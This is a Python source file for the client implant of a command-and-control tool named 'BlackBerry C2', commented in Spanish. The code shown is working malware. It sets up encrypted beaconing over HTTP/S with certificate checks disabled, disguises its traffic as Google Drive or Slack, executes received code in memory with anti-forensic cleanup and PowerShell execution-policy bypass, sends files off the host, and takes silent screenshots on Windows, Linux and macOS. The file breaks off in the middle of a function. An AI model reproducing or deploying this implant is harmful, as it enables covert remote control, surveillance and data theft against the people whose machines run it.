#!/usr/bin/env python3
# BlackBerry HTTP/S Client
import socket, struct, sys, os, time, threading, getpass, subprocess, hashlib, signal, zlib, tempfile, platform, ssl, json, io, base64, shutil, uuid, random, argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import http.client
from queue import Queue, Empty
from collections import deque
import hmac as hmac_module

try:
    import zstandard as zstd
    ZSTD_AVAILABLE = True
except ImportError:
    ZSTD_AVAILABLE = False

# ==================== CONFIGURACIÓN ====================
SERVER_HOST = "localhost"
SERVER_PORT = 8443  # Puerto del proxy HTTP/S
USE_HTTPS = None  # True = HTTPS, False = HTTP, None = auto-detect
HMAC_PRE_SHARED_SECRET = b"BlackBerryC2-HMACSecret"

import threading as _thr
_seq_lock    = _thr.Lock()
_seq_counter = 0

def _next_seq():
    global _seq_counter
    with _seq_lock:
        n = _seq_counter
        _seq_counter = (_seq_counter + 1) & 0xFFFFFFFFFFFFFFFF
        return n
VERIFY_FINGERPRINT = False
EXPECTED_FINGERPRINT = ""
DAEMON_MODE = False

# Long-polling
LONG_POLL_TIMEOUT = 30
CLIENT_POLL_TIMEOUT = 35

ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
HEARTBEAT_INTERVAL = 160
AES_KEY_BYTES = 32
RECONNECT_DELAY = 5
EXEC_TIMEOUT = 120
HTTP_TIMEOUT = 30

CHUNK_SIZE = 64 * 1024
MAX_OUTPUT_SIZE = 1024 * 1024 * 100
LARGE_FILE_THRESHOLD = 1024 * 1024 * 1024
FILE_TIMEOUT_BASE = 90
FILE_TIMEOUT_PER_MB = 20
FILE_MAX_TIMEOUT = 7200
FILE_MIN_TIMEOUT = 45

DEBUG = False  # Silencioso por defecto

# ── PERFIL DE TRÁFICO MALLEABLE ──────────────────────────────────────────────
# Configurable: "aws", "office365", "slack", "dropbox", "gdrive", "telegram"
# O ruta a un archivo JSON/YAML de perfil custom
C2_PROFILE = "gdrive"   # ← Cambiado por payloadG al generar

try:
    import os as _os, sys as _sys
    _sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
    from bb_profiles import load_profile as _load_profile, build_client_headers
    _PROFILE = _load_profile(C2_PROFILE)
    _PROFILES_AVAILABLE = True
except Exception:
    _PROFILES_AVAILABLE = False
    _PROFILE = None
    def build_client_headers(prof, sid="", extra=None):
        h = {"X-Session-ID": sid, "User-Agent": "Mozilla/5.0", "Content-Type": "application/octet-stream"}
        if extra: h.update(extra)
        return h

# Endpoints: resueltos desde el perfil si está disponible
def _ep(task):
    if _PROFILES_AVAILABLE and _PROFILE:
        return _PROFILE.uri_for_task(task)
    # Fallback hardcoded
    _fallback = {
        "handshake": ENDPOINT_HANDSHAKE,
        "message": ENDPOINT_SYNC,
        "polling": ENDPOINT_POLL,
        "upload": ENDPOINT_FILE_UPLOAD,
        "download": ENDPOINT_FILE_DOWNLOAD,
        "file_transfer": ENDPOINT_FILE_UPLOAD,
    }
    return _fallback.get(task, ENDPOINT_SYNC)

# Mantener compatibilidad con código existente
ENDPOINT_HANDSHAKE = "/handshake"
ENDPOINT_SYNC = "/api/v1/sync"
ENDPOINT_POLL = "/bot/getUpdates"
ENDPOINT_FILE_UPLOAD = "/upload/drive/v3/files"
ENDPOINT_FILE_DOWNLOAD = "/drive/v3/files"

def log(msg):
    if DEBUG:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def calculate_file_timeout(file_size_bytes):
    size_mb = file_size_bytes / (1024 * 1024)
    timeout = FILE_TIMEOUT_BASE + (size_mb * FILE_TIMEOUT_PER_MB)
    return max(FILE_MIN_TIMEOUT, min(timeout, FILE_MAX_TIMEOUT))

def format_bytes(bytes_count):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_count < 1024.0:
            return f"{bytes_count:.2f} {unit}"
        bytes_count /= 1024.0
    return f"{bytes_count:.2f} PB"

def get_ecdhe_fingerprint(public_key_pem):
    """Calcula fingerprint SHA256 de la clave pública ECDHE."""
    sha256_hash = hashlib.sha256(public_key_pem).hexdigest()
    return ':'.join(sha256_hash[i:i+2] for i in range(0, len(sha256_hash), 2))

# ==================== EJECUCIÓN EN MEMORIA ====================
def execute_in_memory_robust(file_bytes, file_name="<received>"):
    """
    Ejecución FILELESS anti-forense en memoria.
    - Ejecuta en el mismo proceso (Python)
    - Borra todo rastro de memoria después
    - Sin archivos temporales
    - Soporte multi-lenguaje interpretado
    """
    import gc
    
    ext = os.path.splitext(file_name)[1].lower()
    
    # Interpretes soportados (solo lenguajes NO compilables)
    interpreters = {
        ".py": ("python", ["python3", "-c"], False),
        ".py2": ("python2", ["python2", "-c"], False),
        ".sh": ("bash", ["bash", "-c"], False),
        ".bash": ("bash", ["bash", "-c"], False),
        ".pl": ("perl", ["perl", "-e"], False),
        ".rb": ("ruby", ["ruby", "-e"], False),
        ".php": ("php", ["php", "-r"], False),
        ".js": ("node", ["node", "-e"], False),
        ".lua": ("lua", ["lua", "-e"], False),
        ".awk": ("awk", ["awk"], False),
        ".r": ("r", ["Rscript", "-e"], False),
        ".R": ("r", ["Rscript", "-e"], False),
        ".ps1": ("powershell", ["pwsh", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"], False),
        ".psm1": ("powershell", ["pwsh", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"], False),
        ".zsh": ("zsh", ["zsh", "-c"], False),
        ".fish": ("fish", ["fish", "-c"], False),
        ".ksh": ("ksh", ["ksh", "-c"], False),
        ".csh": ("csh", ["csh", "-c"], False),
        ".tcsh": ("tcsh", ["tcsh", "-c"], False),
    }
    
    # Soporte para Windows
    if platform.system() == "Windows":
        interpreters[".ps1"] = ("powershell", ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"], False)
        interpreters[".psm1"] = ("powershell", ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"], False)
    
    if ext in interpreters:
        lang_type, cmd_base, _ = interpreters[ext]
    else:
        lang_type, cmd_base = "bash", ["bash", "-c"]
    
    try:
        # Decodificar código
        code_str = file_bytes.decode('utf-8', errors='replace')
        
        # ========== EJECUCIÓN PYTHON EN EL MISMO PROCESO (FILELESS TOTAL) ==========
        if lang_type in ("python", "python2"):
            try:
                # Crear namespace temporal aislado
                temp_namespace = {
                    '__builtins__': __builtins__,
                    '__name__': '__main__',
                    '__file__': '<memory>',
                }
                
                # Capturar stdout/stderr
                from io import StringIO
                import sys
                
                old_stdout = sys.stdout
                old_stderr = sys.stderr
                captured_out = StringIO()
                captured_err = StringIO()
                
                try:
                    sys.stdout = captured_out
                    sys.stderr = captured_err
                    
                    # EJECUTAR EN MEMORIA (mismo proceso, sin subprocess)
                    exec(compile(code_str, '<memory>', 'exec'), temp_namespace)
                    
                finally:
                    sys.stdout = old_stdout
                    sys.stderr = old_stderr
                
                # Obtener salida
                stdout_data = captured_out.getvalue()
                stderr_data = captured_err.getvalue()
                output = (stdout_data + stderr_data).strip()
                
                # LIMPIEZA ANTI-FORENSE
                # Sobrescribir código en memoria antes de borrar
                code_str = None
                file_bytes = None
                
                # Limpiar namespace temporal
                for key in list(temp_namespace.keys()):
                    temp_namespace[key] = None
                temp_namespace.clear()
                
                # Limpiar capturas
                captured_out.close()
                captured_err.close()
                
                # Forzar recolección de basura
                gc.collect()
                
                if not output:
                    output = "[Ejecutado exitosamente en memoria]"
                
                return True, output
                
            except SyntaxError as e:
                return False, f"[ERROR] Sintaxis Python: {e}"
            except Exception as e:
                return False, f"[ERROR] Ejecución Python: {str(e)}"
        
        # ========== OTROS LENGUAJES: STDIN PIPE (SIN ARCHIVOS TEMP) ==========
        else:
            try:
                # Verificar disponibilidad del intérprete antes de ejecutar
                if cmd_base:
                    try:
                        subprocess.run([cmd_base[0], "--version"], 
                                     capture_output=True, timeout=5)
                    except (FileNotFoundError, subprocess.TimeoutExpired):
                        # Intentar alternativas comunes
                        alternatives = {
                            "python3": ["python"],
                            "node": ["nodejs"],
                            "pwsh": ["powershell"],
                        }
                        if cmd_base[0] in alternatives:
                            for alt in alternatives[cmd_base[0]]:
                                try:
                                    subprocess.run([alt, "--version"], 
                                                 capture_output=True, timeout=5)
                                    cmd_base[0] = alt
                                    break
                                except:
                                    continue
                            else:
                                return False, f"[ERROR] Intérprete no encontrado: {cmd_base[0]}"
                        else:
                            return False, f"[ERROR] Intérprete no encontrado: {cmd_base[0]}"
                
                # Usar stdin para pasar el código (sin archivos)
                if lang_type == "awk":
                    # AWK necesita el código como argumento
                    proc = subprocess.Popen(
                        ["awk", code_str],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False
                    )
                else:
                    # La mayoría soporta -c/-e con stdin
                    proc = subprocess.Popen(
                        cmd_base + [code_str],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False,
                        close_fds=True  # Cerrar file descriptors para no dejar rastro
                    )
                
                # Ejecutar con timeout
                try:
                    stdout_data, stderr_data = proc.communicate(timeout=EXEC_TIMEOUT)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout_data, stderr_data = proc.communicate()
                    
                    # LIMPIEZA
                    code_str = None
                    file_bytes = None
                    gc.collect()
                    
                    return False, f"[TIMEOUT] Ejecución excedió {EXEC_TIMEOUT}s"
                
                # Procesar salida
                stdout_text = stdout_data.decode('utf-8', errors='replace')
                stderr_text = stderr_data.decode('utf-8', errors='replace')
                output = (stdout_text + stderr_text).strip()
                
                # LIMPIEZA ANTI-FORENSE
                code_str = None
                file_bytes = None
                stdout_data = None
                stderr_data = None
                gc.collect()
                
                if not output:
                    output = f"[Ejecutado. Código: {proc.returncode}]"
                
                return True, output
                
            except FileNotFoundError:
                return False, f"[ERROR] Intérprete no encontrado: {cmd_base[0]}"
            except Exception as e:
                # Limpieza en caso de error
                code_str = None
                file_bytes = None
                gc.collect()
                return False, f"[ERROR] Ejecución: {str(e)}"
    
    except Exception as e:
        # Limpieza final en cualquier error
        try:
            code_str = None
            file_bytes = None
            gc.collect()
        except:
            pass
        return False, f"[ERROR] Fallo crítico: {str(e)}"

# ==================== CLIENTE HTTP/HTTPS AUTO ====================
class BlackBerryHTTPClient:
    def __init__(self, host, port, use_https=None):
        self.host = host
        self.port = port
        self.use_https = use_https
        self.aes_key = None
        self.connected = False
        self.lock = threading.Lock()
        self.response_queue = Queue()
        self.file_transfer_active = False
        self.file_transfer_lock = threading.Lock()
        
        # ===== UUID ÚNICO POR INSTANCIA =====
        self.session_id = str(uuid.uuid4())
        log(f"Session UUID generado: {self.session_id}")
        
        if self.use_https is None:
            self.use_https = self._auto_detect_protocol()
            protocol = "HTTPS" if self.use_https else "HTTP"
            log(f"Protocolo auto-detectado: {protocol}")
    
    def _auto_detect_protocol(self):
        """Auto-detecta si el servidor usa HTTPS o HTTP."""
        log("Detectando protocolo...")
        
        # Intentar HTTPS primero
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.host, self.port), timeout=3) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    ssock.sendall(b"GET / HTTP/1.0\r\n\r\n")
                    response = ssock.recv(100)
                    if b"HTTP" in response:
                        log("[+] HTTPS detectado")
                        return True
        except:
            pass
        
        # Intentar HTTP
        try:
            with socket.create_connection((self.host, self.port), timeout=3) as sock:
                sock.sendall(b"GET / HTTP/1.0\r\n\r\n")
                response = sock.recv(100)
                if b"HTTP" in response:
                    log("[+] HTTP detectado")
                    return False
        except:
            pass
        
        log("⚠ No se pudo detectar protocolo, usando HTTP")
        return False
    
    def _create_connection(self, timeout=HTTP_TIMEOUT):
        """Crea nueva conexión HTTP o HTTPS."""
        try:
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                conn = http.client.HTTPSConnection(
                    self.host,
                    self.port,
                    timeout=timeout,
                    context=context
                )
            else:
                conn = http.client.HTTPConnection(
                    self.host,
                    self.port,
                    timeout=timeout
                )
            
            conn.connect()
            return conn
        except Exception as e:
            log(f"Error creando conexión: {e}")
            return None
    
    def _http_request(self, endpoint, data, retry=3, timeout=HTTP_TIMEOUT):
        """Hace un POST HTTP/HTTPS a un endpoint específico."""
        for attempt in range(retry):
            conn = None
            try:
                conn = self._create_connection(timeout)
                if not conn:
                    continue
                
                # ===== HEADERS CON PERFIL MALLEABLE =====
                _raw_data = data
                _ct = 'application/octet-stream'
                if _PROFILES_AVAILABLE and _PROFILE:
                    _raw_data, _ct = _PROFILE.wrap_data_client(data)
                    headers = build_client_headers(_PROFILE, self.session_id, {
                        'Content-Type': _ct,
                        'Content-Length': str(len(_raw_data)),
                        'Connection': 'close',
                    })
                else:
                    headers = {
                        'X-Session-ID': self.session_id,
                        'Content-Type': _ct,
                        'Content-Length': str(len(_raw_data)),
                        'Connection': 'close',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                
                conn.request('POST', endpoint, body=_raw_data, headers=headers)
                response = conn.getresponse()
                
                if response.status != 200:
                    log(f"HTTP {response.status}: {response.reason} en {endpoint}")
                    if attempt < retry - 1:
                        time.sleep(0.5)
                        continue
                    return None
                
                body = response.read()
                # Desempaquetar según perfil (json_field → extraer bytes)
                if _PROFILES_AVAILABLE and _PROFILE:
                    ct = response.getheader("Content-Type", "")
                    body = _PROFILE.unwrap_data_client(body, ct)
                return body
                
            except http.client.RemoteDisconnected:
                log(f"Conexión cerrada (intento {attempt + 1}/{retry})")
                if attempt < retry - 1:
                    time.sleep(0.5)
                    continue
                return None
                
            except Exception as e:
                log(f"Error en {endpoint} (intento {attempt + 1}/{retry}): {e}")
                if attempt < retry - 1:
                    time.sleep(0.5)
                    continue
                return None
                
            finally:
                if conn:
                    try:
                        conn.close()
                    except:
                        pass
        
        return None
    
    def connect(self):
        """Handshake ECDHE + HMAC de 2 fases usando /handshake."""
        try:
            if not DAEMON_MODE:
                log("═" * 50)
                log("Iniciando handshake ECDHE...")
                log("═" * 50)
            
            # FASE 1: REQUEST_PUBKEY → recibir ECDH pública del servidor
            if not DAEMON_MODE:
                log("Fase 1: Solicitando clave ECDH del servidor...")
            response = self._http_request(_ep('handshake'), b'REQUEST_PUBKEY')
            
            if not response:
                if not DAEMON_MODE:
                    log("✗ ERROR: Sin respuesta del servidor")
                return False
            
            if not response.startswith(b'ECDH_PUBKEY:'):
                if not DAEMON_MODE:
                    log(f"✗ ERROR: Respuesta inválida: {response[:50]}")
                return False
            
            server_ecdh_pub_pem = response[len(b'ECDH_PUBKEY:'):]
            if not DAEMON_MODE:
                log(f"[+] Clave ECDH recibida ({len(server_ecdh_pub_pem)} bytes)")
            
            try:
                server_ecdh_pub = serialization.load_pem_public_key(server_ecdh_pub_pem)
            except Exception as e:
                if not DAEMON_MODE:
                    log(f"✗ ERROR: Clave ECDH inválida: {e}")
                return False
            
            # Verificar fingerprint ECDHE si está habilitado
            if VERIFY_FINGERPRINT:
                server_fingerprint = get_ecdhe_fingerprint(server_ecdh_pub_pem)
                if not DAEMON_MODE:
                    log(f"[*] Fingerprint servidor ECDHE: {server_fingerprint}")
                
                if server_fingerprint.lower() != EXPECTED_FINGERPRINT.lower():
                    if not DAEMON_MODE:
                        log("[!] Fingerprint ECDHE no coincide. Abortando.")
                    return False
                
                if not DAEMON_MODE:
                    log("[+] Fingerprint ECDHE verificado correctamente")
            
            # FASE 2: ECDHE key exchange + HMAC
            if not DAEMON_MODE:
                log("Fase 2: ECDHE key exchange + HMAC authentication...")
            
            # Generar par ECDH efímero del cliente
            client_ecdh_private = ec.generate_private_key(ec.SECP256R1())
            client_ecdh_public_pem = client_ecdh_private.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            # Calcular secreto compartido ECDH
            shared_secret = client_ecdh_private.exchange(ec.ECDH(), server_ecdh_pub)
            
            # Derivar clave AES-256 con HKDF
            aes_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'BlackBerryC2_AES_KEY',
            ).derive(shared_secret)
            
            if not DAEMON_MODE:
                log("[*] Secreto compartido calculado via ECDHE")
                log("[*] Clave AES-256 derivada con HKDF")
            
            # Calcular HMAC de autenticación
            hmac_tag = hmac_module.new(
                HMAC_PRE_SHARED_SECRET, shared_secret, hashlib.sha256
            ).digest()
            
            if not DAEMON_MODE:
                log("[*] HMAC de autenticación generado")
            
            # Enviar: [4 bytes longitud PEM] + [PEM del cliente] + [32 bytes HMAC]
            aes_packet = struct.pack('!I', len(client_ecdh_public_pem)) + client_ecdh_public_pem + hmac_tag
            if not DAEMON_MODE:
                log(f"  Enviando ECDH pubkey + HMAC ({len(aes_packet)} bytes)...")
            
            response = self._http_request(_ep('handshake'), aes_packet)
            
            if response == b'OK':
                with self.lock:
                    self.aes_key = aes_key
                    self.connected = True
                if not DAEMON_MODE:
                    log("[+] Handshake ECDHE + HMAC completado!")
                    log(f"[+] Session ID: {self.session_id[:8]}...")
                    protocol = "HTTPS" if self.use_https else "HTTP"
                    log(f"[+] Canal seguro establecido ({protocol} + AES-256-GCM + Perfect Forward Secrecy)")
                    log("═" * 50)
                return True
            else:
                if not DAEMON_MODE:
                    log(f"[!] ERROR: Respuesta inesperada: {response}")
                return False
                
        except Exception as e:
            if not DAEMON_MODE:
                log(f"[!] ERROR CRÍTICO en handshake: {e}")
                import traceback
                traceback.print_exc()
            return False
    
    def _encrypt_message(self, plaintext):
        """Wire: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC] — compatible b.py"""
        try:
            pb = plaintext.encode('utf-8') if isinstance(plaintext, str) else plaintext
            flag, payload = 0, pb
            if ENABLE_COMPRESSION and len(pb) > 100:
                try:
                    c2 = zlib.compress(pb, level=COMPRESSION_LEVEL)
                    if len(c2) < len(pb): payload, flag = c2, 1
                except: pass
            with self.lock:
                if not self.aes_key: return None
                nonce  = os.urandom(12)
                cipher = AESGCM(self.aes_key).encrypt(nonce, payload, None)
                seq    = struct.pack('!Q', _next_seq())
                htag   = hmac_module.new(self.aes_key, seq+nonce+cipher, hashlib.sha256).digest()
            msg = seq + bytes([flag]) + nonce + cipher + htag
            return struct.pack('!I', len(msg)) + msg
        except Exception as e:
            log(f"Error cifrando mensaje: {e}")
            return None
    
    def _encrypt_chunk(self, chunk, use_zstd=False):
        """Wire: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC] — compatible b.py"""
        try:
            flag, payload = 0, chunk
            if use_zstd and ZSTD_AVAILABLE:
                try:
                    c2 = zstd.ZstdCompressor(level=3).compress(chunk)
                    if len(c2) < len(chunk): payload, flag = c2, 2
                except: pass
            elif ENABLE_COMPRESSION:
                try:
                    c2 = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                    if len(c2) < len(chunk): payload, flag = c2, 1
                except: pass
            with self.lock:
                if not self.aes_key: return None
                nonce  = os.urandom(12)
                cipher = AESGCM(self.aes_key).encrypt(nonce, payload, None)
                seq    = struct.pack('!Q', _next_seq())
                htag   = hmac_module.new(self.aes_key, seq+nonce+cipher, hashlib.sha256).digest()
            msg = seq + bytes([flag]) + nonce + cipher + htag
            return struct.pack('!I', len(msg)) + msg
        except: return None
    
    def _decrypt_message(self, data):
        """Wire: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC] — compatible b.py"""
        try:
            if not data or len(data) < 4: return None
            msg_len = struct.unpack('!I', data[:4])[0]
            if msg_len == 0 or len(data) < 4 + msg_len: return None
            pkt = data[4:4 + msg_len]
            if len(pkt) < 53: return None   # 8+1+12+0+32
            seq   = pkt[0:8]
            flag  = pkt[8]
            nonce = pkt[9:21]
            htag  = pkt[-32:]
            ciph  = pkt[21:-32]
            with self.lock:
                if not self.aes_key: return None
                if not hmac_module.compare_digest(
                    htag, hmac_module.new(self.aes_key, seq+nonce+ciph, hashlib.sha256).digest()):
                    return None
                pb = AESGCM(self.aes_key).decrypt(nonce, ciph, None)
            if flag == 1: pb = zlib.decompress(pb)
            elif flag == 2:
                if ZSTD_AVAILABLE: pb = zstd.ZstdDecompressor().decompress(pb)
                else: return None
            return pb.decode('utf-8', errors='replace')
        except: return None
    
    def _decrypt_chunk(self, data):
        """Descifra un chunk de archivo."""
        try:
            if not data or len(data) < 4:
                return None
            
            msg_len = struct.unpack('!I', data[:4])[0]
            if msg_len == 0 or len(data) < 4 + msg_len:
                return None
            
            packet = data[4:4 + msg_len]
            if len(packet) < 13:
                return None
            
            flag = packet[0]
            nonce = packet[1:13]
            ciphertext = packet[13:]
            
            with self.lock:
                if not self.aes_key:
                    return None
                
                aesgcm = AESGCM(self.aes_key)
                plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
            
            if flag == 1:
                plaintext_bytes = zlib.decompress(plaintext_bytes)
            elif flag == 2:
                if ZSTD_AVAILABLE:
                    dctx = zstd.ZstdDecompressor()
                    plaintext_bytes = dctx.decompress(plaintext_bytes)
                else:
                    return None
            
            return plaintext_bytes
            
        except:
            return None
    
    def send_message(self, message):
        """Envía un mensaje cifrado usando /api/v1/sync."""
        try:
            encrypted = self._encrypt_message(message)
            if not encrypted:
                return False
            
            response = self._http_request(_ep('message'), encrypted)
            return response is not None
            
        except Exception as e:
            log(f"Error enviando mensaje: {e}")
            return False
    
    def receive_message(self):
        """Recibe un mensaje con LONG-POLLING (espera hasta 30s)."""
        try:
            encrypted_poll = self._encrypt_message("LONG_POLL")
            if not encrypted_poll:
                return None
            
            # Long-polling: timeout extendido
            response = self._http_request(
                _ep('polling'), 
                encrypted_poll, 
                retry=1, 
                timeout=CLIENT_POLL_TIMEOUT
            )
            
            if not response or len(response) < 4:
                return None
            
            msg_len = struct.unpack('!I', response[:4])[0]
            if msg_len == 0:
                return None
            
            message = self._decrypt_message(response)
            return message
            
        except Exception as e:
            return None
    
    def send_file_to_server(self, file_path):
        """Envía un archivo al servidor (GET_FILE)."""
        try:
            if not os.path.isfile(file_path):
                self.send_message(f"[ERROR] Archivo no encontrado: {file_path}")
                return False
            
            file_size = os.path.getsize(file_path)
            timeout = calculate_file_timeout(file_size)
            use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
            
            log(f"Enviando archivo: {file_path} ({format_bytes(file_size)})")
            
            sha = hashlib.sha256()
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                    sha.update(chunk)
            file_hash = sha.hexdigest()
            
            header = f"SIZE {file_size} {file_hash}"
            if not self.send_message(header):
                log("Error enviando header de archivo")
                return False
            
            chunks_sent = 0
            bytes_sent = 0
            
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    
                    encrypted_chunk = self._encrypt_chunk(chunk, use_zstd)
                    if not encrypted_chunk:
                        log("Error cifrando chunk")
                        return False
                    
                    response = self._http_request(
                        _ep('upload'), 
                        encrypted_chunk, 
                        timeout=timeout
                    )
                    
                    if response is None:
                        log("Error enviando chunk")
                        return False
                    
                    chunks_sent += 1
                    bytes_sent += len(chunk)
                    
                    if chunks_sent % 10 == 0:
                        progress = (bytes_sent / file_size) * 100
                        log(f"Progreso: {progress:.1f}% ({format_bytes(bytes_sent)})")
            
            log(f"[+] Archivo enviado: {chunks_sent} chunks, {format_bytes(bytes_sent)}")
            return True
            
        except Exception as e:
            log(f"Error enviando archivo: {e}")
            self.send_message(f"[ERROR] Fallo al enviar archivo: {e}")
            return False
    
    def send_raw_encrypted_data(self, encrypted_data):
        """Envía datos ya encriptados al servidor (para screenshot)."""
        try:
            response = self._http_request(
                _ep('upload'), 
                encrypted_data, 
                timeout=60
            )
            return response is not None
        except Exception as e:
            log(f"Error enviando datos encriptados: {e}")
            return False
    
    def receive_file(self, header_msg):
        """Recibe un archivo del servidor (SIZE header -> chunks -> PUT_FILE)."""
        try:
            parts = header_msg.split()
            file_size = int(parts[1])
            expected_hash = parts[2]
            
            timeout = calculate_file_timeout(file_size)
            use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
            
            log(f"Recibiendo archivo: {format_bytes(file_size)}")
            
            file_data = b''
            sha = hashlib.sha256()
            
            while len(file_data) < file_size:
                encrypted_poll = self._encrypt_message("FILE_CHUNK")
                if not encrypted_poll:
                    return None
                
                response = self._http_request(
                    _ep('download'), 
                    encrypted_poll, 
                    retry=1, 
                    timeout=timeout
                )
                
                if not response or len(response) < 4:
                    log("Error recibiendo chunk")
                    return None
                
                chunk = self._decrypt_chunk(response)
                if chunk is None:
                    log("Error descifrando chunk")
                    return None
                
                file_data += chunk
                sha.update(chunk)
                
                progress = (len(file_data) / file_size) * 100
                if int(progress) % 10 == 0:
                    log(f"Progreso: {progress:.1f}%")
            
            if sha.hexdigest() != expected_hash:
                self.send_message("[ERROR] Fallo de integridad del archivo")
                return None
            
            put_cmd = self.receive_message()
            if not put_cmd or not put_cmd.startswith("PUT_FILE"):
                return None
            
            log(f"[+] Archivo recibido: {format_bytes(file_size)}")
            return file_data, put_cmd
            
        except Exception as e:
            log(f"Error recibiendo archivo: {e}")
            return None
    
    def is_connected(self):
        with self.lock:
            return self.connected
    
    def disconnect(self):
        with self.lock:
            self.connected = False
            self.aes_key = None

# ==================== CAPTURA DE PANTALLA ====================

def capture_screenshot():
    """
    Captura la pantalla usando métodos nativos del sistema operativo.
    Retorna los bytes de la imagen en formato BMP/PNG sin guardar archivos.
    """
    system = sys.platform
    
    try:
        if system == 'win32':
            return _capture_screenshot_windows()
        elif system.startswith('linux'):
            return _capture_screenshot_linux()
        elif system == 'darwin':
            return _capture_screenshot_macos()
        else:
            return None
    except Exception:
        return None

def _capture_screenshot_windows():
    """Captura en Windows usando ctypes + GDI32"""
    try:
        import ctypes
        from ctypes import windll, byref, c_int, Structure, POINTER
        from ctypes.wintypes import BYTE, WORD, DWORD, LONG, HANDLE
        
        class BITMAPINFOHEADER(Structure):
            _fields_ = [
                ('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
                ('biPlanes', WORD), ('biBitCount', WORD), ('biCompression', DWORD),
                ('biSizeImage', DWORD), ('biXPelsPerMeter', LONG),
                ('biYPelsPerMeter', LONG), ('biClrUsed', DWORD), ('biClrImportant', DWORD)
            ]
        
        class BITMAPINFO(Structure):
            _fields_ = [('bmiHeader', BITMAPINFOHEADER), ('bmiColors', DWORD * 3)]
        
        user32 = windll.user32
        gdi32 = windll.gdi32
        
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbitmap)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
        
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = screen_width
        bmi.bmiHeader.biHeight = -screen_height
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0
        
        bitmap_size = screen_width * screen_height * 3
        bitmap_data = (BYTE * bitmap_size)()
        gdi32.GetDIBits(hdc_mem, hbitmap, 0, screen_height, bitmap_data, byref(bmi), 0)
        
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        
        return _create_bmp_from_rgb(bytes(bitmap_data), screen_width, screen_height)
    except Exception:
        return None

def _capture_screenshot_linux():
    """Captura en Linux usando herramientas del sistema"""
    try:
        # Método 1: scrot
        try:
            result = subprocess.run(['scrot', '-o', '/dev/stdout'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 2: imagemagick
        try:
            result = subprocess.run(['import', '-window', 'root', 'png:-'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 3: gnome-screenshot
        try:
            tmp_path = '/dev/shm/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8]
            result = subprocess.run(['gnome-screenshot', '-f', tmp_path],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and os.path.exists(tmp_path):
                with open(tmp_path, 'rb') as f:
                    data = f.read()
                try:
                    os.remove(tmp_path)
                except:
                    pass
                return data
        except:
            pass
        
        # Método 4: xwd + convert
        try:
            xwd_result = subprocess.run(['xwd', '-root', '-silent'],
                                      capture_output=True, timeout=5, check=False)
            if xwd_result.returncode == 0:
                convert_result = subprocess.run(['convert', 'xwd:-', 'png:-'],
                                              input=xwd_result.stdout,
                                              capture_output=True, timeout=5, check=False)
                if convert_result.returncode == 0 and convert_result.stdout:
                    return convert_result.stdout
        except:
            pass
        
        return None
    except Exception:
        return None

def _capture_screenshot_macos():
    """Captura en macOS usando screencapture nativo"""
    try:
        tmp_path = '/tmp/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8] + '.png'
        result = subprocess.run(['screencapture', '-x', '-t', 'png', tmp_path],
                              capture_output=True, timeout=5, check=False)
        
        if result.returncode == 0 and os.path.exists(tmp_path):
            with open(tmp_path, 'rb') as f:
                data = f.read()
            try:
                os.remove(tmp_path)
            except:
                pass
            return data
        return None
    except Exception:
        return None

def _create_bmp_from_rgb(rgb_data, width, height):
